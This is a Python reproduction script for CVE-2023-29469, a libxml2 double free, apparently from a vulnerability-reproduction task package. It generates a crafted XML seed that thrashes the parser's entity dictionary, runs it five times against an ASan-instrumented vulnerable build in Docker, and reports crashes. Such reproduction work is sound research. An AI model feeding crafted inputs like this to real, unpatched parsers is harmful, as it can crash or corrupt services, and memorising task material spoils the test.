import os
import subprocess
import time

def run_cmd(cmd, cwd=None):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            check=False,
            cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding='utf-8',
            errors='ignore'
        )
        return result
    except Exception as e:
        print(f"Error running command {cmd}: {e}")
        return None

def main():
    print("======================================================================")
    print("Manual Reproduction for CVE-2023-29469 (LibXML2 Double Free)")
    print("======================================================================")
    
    # 1. Create Malicious Seed (repro.xml) with heavy dictionary usage
    print("\n[+] Generating malicious seed 'repro.xml'...")
    
    # Payload: Heavy use of empty entities to thrash the dictionary
    entities = "".join([f'<!ENTITY e{i} "">' for i in range(200)])
    refs = "".join([f'&e{i};' for i in range(200)])
    
    seed_content = f"""<?xml version="1.0"?>
<!DOCTYPE doc [
<!ELEMENT doc (#PCDATA)>
{entities}
]>
<doc>{refs}</doc>
"""
    
    seed_path = "tasks/CVE-2023-29469_libxml2/seeds/repro.xml"
    os.makedirs(os.path.dirname(seed_path), exist_ok=True)
    with open(seed_path, "w") as f:
        f.write(seed_content)
    
    print(f"    Seed created at {seed_path} ({len(seed_content)} bytes)")

    # 2. Build Docker images first
    print("\n[+] Building Docker images...")
    build_cmd = "docker compose -f tasks/CVE-2023-29469_libxml2/compose.yml build"
    res_build = run_cmd(build_cmd)
    if res_build.returncode != 0:
        print("Build failed!")
        print(res_build.stderr)
        return

    # 3. Run against Vulnerable Version (Multiple times)
    print("\n[+] Running against Vulnerable Version (2.10.3 + ASan)")
    print("    Note: This vulnerability is FLAKY. Running 5 times...")
    
    docker_cmd = "docker compose -f tasks/CVE-2023-29469_libxml2/compose.yml run --rm target-vuln /harness/harness /seeds/repro.xml"
    
    crashes = 0
    total_runs = 5
    
    for i in range(1, total_runs + 1):
        print(f"    Run {i}/{total_runs}...", end="", flush=True)
        res = run_cmd(docker_cmd)
        
        if not res:
            print(" Error executing Docker command.")
            continue
            
        # Check triggers
        # 1. ASan output in stderr
        # 2. Exit code 139 (SEGV) or 134 (ABRT/ASan)
        
        stderr = res.stderr or ""
        stdout = res.stdout or ""
        combined = stderr + stdout
        
        asan_found = "AddressSanitizer" in combined and ("double-free" in combined or "heap-use-after-free" in combined)
        crash_code = res.returncode in [139, 134]
        
        if asan_found or crash_code:
            crashes += 1
            print(f" CRASH! {'(ASan confirmed)' if asan_found else '(Exit code ' + str(res.returncode) + ')'}")
            if asan_found:
                 # Print the error line
                 for line in stderr.splitlines():
                     if "AddressSanitizer" in line:
                         print(f"      -> {line}")
                         break
        else:
            print(" No crash.")
            
    print("-" * 60)
    print(f"Results: {crashes}/{total_runs} runs crashed.")
    
    if crashes > 0:
        print("\n[SUCCESS] Vulnerability reproduced interactively.")
    else:
        print("\n[FAILURE] No crash detected in 5 runs.")

if __name__ == "__main__":
    main()
